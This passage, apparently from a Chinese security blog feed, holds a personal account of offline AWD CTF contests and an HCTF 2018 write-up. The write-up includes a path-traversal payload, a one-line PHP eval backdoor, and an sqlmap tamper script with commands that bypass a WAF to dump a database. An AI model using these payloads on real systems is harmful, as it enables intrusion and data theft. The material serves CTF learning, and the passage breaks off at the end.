class="line">/?token=8be48bdbe1c914d11532f9bd4b6a192d&amp;content=&#123;&quot;result&quot;:[[&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bctf{XsS_SQL1_7438x_2xfccmk}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记上海赛线下与湖湘杯决赛</title>
      <link href="/2018/11/30/%E8%AE%B0%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E4%B8%8E%E6%B9%96%E6%B9%98%E6%9D%AF%E5%86%B3%E8%B5%9B/"/>
      <url>/2018/11/30/%E8%AE%B0%E4%B8%8A%E6%B5%B7%E8%B5%9B%E7%BA%BF%E4%B8%8B%E4%B8%8E%E6%B9%96%E6%B9%98%E6%9D%AF%E5%86%B3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h4 id="上海市大学生网络安全竞赛线下赛"><a href="#上海市大学生网络安全竞赛线下赛" class="headerlink" title="上海市大学生网络安全竞赛线下赛"></a>上海市大学生网络安全竞赛线下赛</h4><p>emmmm 感觉又玩成了大乱斗模式。</p><p>两个 Web 一个 Pwn，我们队比较佛系，来了两个 Web 手和一个逆向手，逆向手全程 patch 就完了，pwn 到下午才有人打出来，pwn 也差不了太多，主要是 Web。</p><p>比赛开始正常备份改密码，然后 D 盾扫了一波，并没有扫出什么后门，不对啊这种比赛应该会有预留后门的。。。 然后惊奇发现有队开始打 web2了，比较懵逼。</p><p>被打了不行马上抓流量，我抓流量的脚本上去但是不好使。。。运维大手子抓了下流量，发现原来尼玛主办方预留了个后门：</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/9223743-fc28432f1e099fb0.png" alt="image.png"></p><p>这后门留的我也是佛了，藏在了 hits 文件夹了，不得不说官方预留后门越来越隐蔽了。</p><p>大家大部分都是直接 cat /flag，而我想着种上不死马，但是我的脚本适用于 php eval命令执行的… 所以不能直接用，还要用终端 <code>echo &quot;马&quot; &gt; &quot;文件名&quot;</code>这样来写，就很麻烦，不死马中单引号双引号搞的我很难受。</p><p>没办法最后我先写了个简单的一句话进去，然后用简单的一句话写不死马，但是大家已经修的差不多了emmm。</p><p>基本就是用这个洞和不死马得分，然后 web1 开始宕机，怎么修也修不好，只好去重置服务，因为真的是宕机扣分太多了。</p><p>好了没有多长时间，又宕机了，才意识肯定是有人搅屎，然后发现数据库被人动了，修了半天也没修上，主办方也没说重置服务扣多少分，也没去重置服务。</p><p>然后还有半小时结束的时候，主办方说免费三次重置，超过次数扣分，但是最后半小时不能重置服务了。。。就这样苟到最后，赛后和师傅们交流，都是一大批一大批去重置服务，因为重置扣的分没有服务正常加的分多… 服务宕机扣的分真是太狠了。</p><p>web1 后台有弱密码，改了密码因为源码里写的是原来的预留密码，所以连不上数据库就宕机，第一的队伍，就是靠疯狂改别人的密码，然后疯狂拿服务正常的分，只能说这个比赛我也是佛了，他们队到快中午的时候，web2 预留后门的洞还没有修。</p><p>这里得说一下 web1，全场都没人打动，这个web1给我们的用户权限太低了，/var/www/html 都没有写权限，那打个锤子。。。 快结束的时候队友发现了个隐藏的 apache 用户，但是没有密码，赛后听说直接 su 不用密码也能登录？出题人 · 真实。</p><p>总结一下比赛：</p><ol><li>强队靠挖洞，弱队靠抓流量，抓流量的脚本一定要准备好，这样的话可以抄作业直接打；</li><li>防御做的还不好，比如这次忘备份数据库了… 还有就是文件监控之类的脚本，以及查看进程及时杀不死马之类的；</li><li>打宕别人服务，可以拿很多分，有时候你打不成，但是你把别人服务都打宕，可能你就赢了…把别人打宕还可以让他们的 web 手忙于修，没法专心审代码挖洞。</li></ol><p>东华大学那个喜天游酒店好贵啊，一晚上双人标间 350，没有单人间，然后我们三个人只好两个双人标间，住了两晚，我的两个队友比赛第二天早上就坐飞机回学校了，而我坐飞机去长沙打湖湘杯。</p><h4 id="湖湘杯线下"><a href="#湖湘杯线下" class="headerlink" title="湖湘杯线下"></a>湖湘杯线下</h4><p>下飞机发现机场连地铁都没有… 导航发现去酒店坐公交要转好多站，直接打了个出租过去。</p><p>去报道发现湖南人原来也好热情，组织人员的服务都特别好。我中午1点左右到的酒店，有很多的服务人员，热心地给我办报道和入住的相关手续，问我吃没吃午饭，我说没吃他们还领我去里面吃了午饭，很 nice!</p><p>不得不说，湖湘杯主办方是真的有钱，比赛奖金70个队一个队3k，第一名16w不说，让我们住长沙红星国际酒店，酒店住的非常舒服，服务很到位，管吃管住条件还这么好可以说是非常良心了。</p><p>一天半的比赛，第一天上午是 AWD 模式，第一天下午是 KingTheHill 模式，第二天下午是真实渗透的模式，对于这一天半的比赛，我只能说这比赛槽点太多了…</p><p>全场屏蔽信号不许外网，然后我们什么也没准备，除了 AWD 其他时间都是基本在摸鱼，全都是 cms 生挖挖不动啊…</p><p>而且 AWD 模式打的十分混乱，很恶心。</p><ol><li>80 个队，网实在是太卡了，经常一直在那里转啊转。只给了页面提交 flag 的方式，我只好抓包去写交flag的脚本，而且交 flag 的平台也老崩，脚本卡死根本跑不动，我的脚本到处都是 <code>try except pass</code>  …</li><li>主办方在根目录预留了个 .shell.php 的后门，很直接就是 <code>@eval($_POST[&#39;c&#39;])</code>，不过最骚的是这个后门删不掉。。。删了后几十秒它又会自动生成，我以为是进程里的结果找了半天也没发现，没办法只好写脚本一直删这个后门。</li><li>平台差评，又丑又不好用，看不到自己服务器情况，被打了和宕机了都不知道…</li><li>服务器 ssh 的密码竟然是每个队的志愿者告诉我们，志愿者好像也不是很懂这些所以也就说的稀里糊涂的，不过还好我算是听懂了我们的志愿者说的，用户名密码都是 user 就登进去了。中午吃饭才发现原来好多队都被这个奇葩的方法坑了，有的队压根就没志愿者，还有的队志愿者没跟他们说。有个同学他们竟然是自己挖洞写马然后菜刀运维服务器…惊了。还有的队上来专改别人的 ssh 密码，被改密码就很惨，我感觉这个事情有点良心不安就只改了自己的密码。</li><li>中午吃饭和一航师傅聊天才得知这比赛选手间互通没隔离。。。他说看到了好多选手开了 phpstudy，还有的直接就是弱密码，直接可以打进选手电脑里…当时幸亏我没开啥端口和服务不然自己主机直接被日了2333。还有的选手电脑被提权了，太狠了。</li><li>比赛快结束我全局一搜 eval 才发现原来主办方还留了一个后门… 留的后门有丶多啊 mmp，我们一直被打而且还被种了不死马，很难受，</li></ol><p>感觉 AWD 比较可惜，发现了预留后门后我直接把我不死马的脚本种上去了，但是由于比较卡的缘故，我写进去了生成不死后门的 php 文件，但是没有及时访问让这个 php 执行。其实我这个都是一套的，写进去然后访问，都是一套自动执行，只是比赛平台太卡了，我的脚本还老异常，就非常难受，没有把不死马种上。中午有人跟我说看到了我写的 gml.php，直接就给删了，我心里是凉凉的。。。只可惜没有及时访问这个 gml.php。</p><p>后面两场因为没外网如同废了，基本全程摸鱼。我们队在一个角落里，后面正好有吃的喝的，然后我们就一直吃喝，好多队都不知道那里有吃的2333，很舒服。</p><p>因为学校有事情第二天下午就赶紧回学校了，正好有 BCTF，蓝莲花出题国际赛题目质量应该很高而且小西师傅说他出的题很有趣，就做了做题，然后就自闭了，不多说上一下 BCTF 的解题情况：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-7dd8115fe2774196.png" alt="image.png"></p><p>Blue-Lotus 的师傅们太强了，等着 docker 复现一波吧….</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 线下 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 HCTF 总结</title>
      <link href="/2018/11/13/2018-HCTF/"/>
      <url>/2018/11/13/2018-HCTF/</url>
      
        <content type="html"><![CDATA[<p>打了一下 HCTF，感觉题目质量很好，学到了一些新姿势。赛后看了下各大顶尖战队师傅们的 wp，总结一下。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>提示源码：</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用了白名单，只有 source.php 和 hint.php 才可以，但是发现有个 ? 截取，可以构造 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=source.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>可以 return ture。</p><p>然后在 include 的时候，<code>include(source.php?/../../../../ffffllllaaaagggg)</code> 解析方式为：把 <code>source.php?</code>当作一个新的文件夹，其实是没有这个文件夹的，然后后一个 <code>../</code> 又跳回了当前目录，后面接着 3 个 ../，意思就是当前目录（源码所在目录）上三级文件夹下有个 ffffllllaaaagggg 文件，可以成功读取。</p><p>访问 <a href="http://warmup.2018.hctf.io/?file=source.php?/../../../../ffffllllaaaagggg，得到flag" target="_blank" rel="noopener">http://warmup.2018.hctf.io/?file=source.php?/../../../../ffffllllaaaagggg，得到flag</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-096c543a33040113.png" alt="image.png"></p><h3 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h3><p>题目进去就跳到 qq 空间登陆界面，发现源码泄露 <a href="http://www.zip，下载下来进行审计。" target="_blank" rel="noopener">www.zip，下载下来进行审计。</a></p><p>发现有全局的 waf：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'@'</span> . $match[<span class="number">0</span>] . <span class="string">'@'</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = safe($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $string = waf($string);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_GET[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_COOKIE[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($cplen, $key, $value);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了一些字符。</p><p>在<code>member.php</code> 中，发现注入点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_CRONLITE'</span>)) <span class="keyword">exit</span>();</span><br><span class="line">$islogin = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"islogin"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"login_data"</span>]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[<span class="string">'login_data'</span>], <span class="keyword">true</span>);</span><br><span class="line">        $admin_user = $login_data[<span class="string">'admin_user'</span>];</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($udata[<span class="string">'username'</span>] == <span class="string">''</span>) &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $login_data[<span class="string">'admin_pass'</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            setcookie(<span class="string">"islogin"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">            setcookie(<span class="string">"login_data"</span>, <span class="string">""</span>, time() - <span class="number">604800</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'islogin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"admin_user"</span>]) &#123;</span><br><span class="line">        $admin_user = base64_decode($_SESSION[<span class="string">'admin_user'</span>]);</span><br><span class="line">        $udata = $DB-&gt;get_row(<span class="string">"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1"</span>);</span><br><span class="line">        $admin_pass = sha1($udata[<span class="string">'password'</span>] . LOGIN_KEY);</span><br><span class="line">        <span class="keyword">if</span> ($admin_pass == $_SESSION[<span class="string">"admin_pass"</span>]) &#123;</span><br><span class="line">            $islogin = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到 login_data 进行了 json_decode，这样可以无视 waf 了。例如过滤了 or ，可以使用<code>\u006fr</code> 来绕过。</p><p>比赛的时候是根据返回头里 set-cookie 的数量来进行布尔盲注，这个语句：</p><p><code>$udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#39;$admin_user&#39; limit 1&quot;);</code></p><p>可以构造 <code>admin&#39;and/**/0\u0023</code> 和 <code>admin&#39;and/**/1\u0023</code>，来控制下面 <code>$udata[&#39;username&#39;] == &#39;&#39;</code>是否为真，通过 set-cookie 数量可以判断。由于下面这条语句 <code>$admin_pass == $login_data[&#39;admin_pass&#39;]</code>，肯定为假，所以肯定有两个 set-cookie，这样可以通过返回头是两个还是四个 set-cookie 来布尔盲注。</p><p>测试：</p><p><code>admin&#39;and/**/0\u0023</code>:</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c237f1a9e953320f.png" alt="image.png"></p><p><code>admin&#39;and/**/1\u0023</code>:</p><p>  <img src="https://upload-images.jianshu.io/upload_images/9223743-150fe3ef01a26b70.png" alt="image.png"></p><p>可以注入。</p><p>然后发现不用注入，直接用 union 控制查询出的 <code>$udata[&#39;password&#39;]</code>就可以登录管理员，但是登入后台发现没有 getshell 的点，审计发现都是 sql 语句没有什么可利用的。</p><p>猜测 flag 在数据库里，然后用盲注一点点注入，最后表名是 F1444g ，字段名是 F1a9 ，注出来 flag。</p><p>赛后看了大师傅们的 wp，发现有师傅直接自己写 tamper 脚本用 sqlmap 注入，自己也正好学一下写 tamper 脚本。</p><p>这里贴上 RR 师傅的脚本：</p><p>tamper/hctf.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    data = <span class="string">'''&#123;"admin_user":"%s"&#125;;'''</span></span><br><span class="line">    payload = payload.lower()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">'u'</span>, <span class="string">'\u0075'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'o'</span>, <span class="string">'\u006f'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'i'</span>, <span class="string">'\u0069'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\''</span>, <span class="string">'\u0027'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'\"'</span>, <span class="string">'\u0022'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">' '</span>, <span class="string">'\u0020'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'s'</span>, <span class="string">'\u0073'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'#'</span>, <span class="string">'\u0023'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&gt;'</span>, <span class="string">'\u003e'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'&lt;'</span>, <span class="string">'\u003c'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'-'</span>, <span class="string">'\u002d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'='</span>, <span class="string">'\u003d'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'f1a9'</span>, <span class="string">'F1a9'</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">'f1'</span>, <span class="string">'F1'</span>)</span><br><span class="line">    <span class="keyword">return</span> data % payload</span><br></pre></td></tr></table></figure><p>命令：<code>python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --dbs</code></p><p>a.txt:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/list.php HTTP/1.1</span><br><span class="line">Host: kzone.2018.hctf.io</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://kzone.2018.hctf.io/admin/login.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Cookie: islogin=1;login_data=*</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">user=admin&amp;pass=1&amp;login=Login</span><br></pre></td></tr></table></figure><p>最后两个 replace 是因为后面注的时候，由于前面<code>payload = payload.lower()</code> 都换成了小写，表名之类的就不对了 ，还要把他们替换回去。</p><p>自己在复现的时候，sqlmap 死活跑不出，参考了一叶飘零师傅的 wp 才意识到是 sqlmap 对于盲注正确与否的不同页面判断有问题。</p><p>按照之前的注入方式，差别仅在响应头 set-cookie 的数量， sqlmap 默认应该是不能通过这样的方式盲注的，所以一直不成功。然后发现做题的时候漏了一个地方自己没有看到这个 <code>$admin_pass == $login_data[&#39;admin_pass&#39;]</code>弱类型。  <code>$admin_pass = sha1($udata[&#39;password&#39;] . LOGIN_KEY);</code> 也就是说是个  sha1 的哈希值，我们可以 admin_pass传入一个数字来弱类型绕过，数字到底是多少可以爆破，爆破到 65 成功，证明那个 sha1 的哈希值是 65 开头的。</p><p>然后就可以登进去了，这样的话盲注就变成了正确时是成功登陆，错误两个 set-cookie。我们现在可以通过 sqlmap 的指定选项 <code>--not-string=window.location</code>来注入了，告诉 sqlmap 盲注错误返回的页面含有 <code>window.location</code>。</p><p>所以我们把 temper 脚本改为 <code>data = &#39;&#39;&#39;{&quot;admin_user&quot;:&quot;admin%s&quot;,&quot;admin_pass&quot;:65};&#39;&#39;&#39;</code>，然后命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -dbs</span><br></pre></td></tr></table></figure><p>–technique=B 指定注入为 Bool 盲注, 发现注出了数据库：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-db3a1da3ba2543c4.png" alt="image.png"></p><p>接下来就是注表名，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone --tables</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-13df79edfc233129.png" alt="image.png"></p><p>注字段名，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone -T F1444g --columns</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f4ebb34447e4ece8.png" alt="image.png"></p><p>最后注flag，命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --technique=B --not-string=window.location -D hctf_kouzone -T F1444g -C F1a9 --dumps</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f23c07976a0a9897.png" alt="image.png"></p><p>另外，发现注入点也可以不用布尔盲注，采用时间盲注，就没有布尔盲注正确与错误的情况 sqlmap 能否识别的问题了。可以注出来但是效率就低了，sqlmap 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r a.txt --tamper=hctf --dbms=mysql --thread=10 --technique=T</span><br></pre></td></tr></table></figure><h3 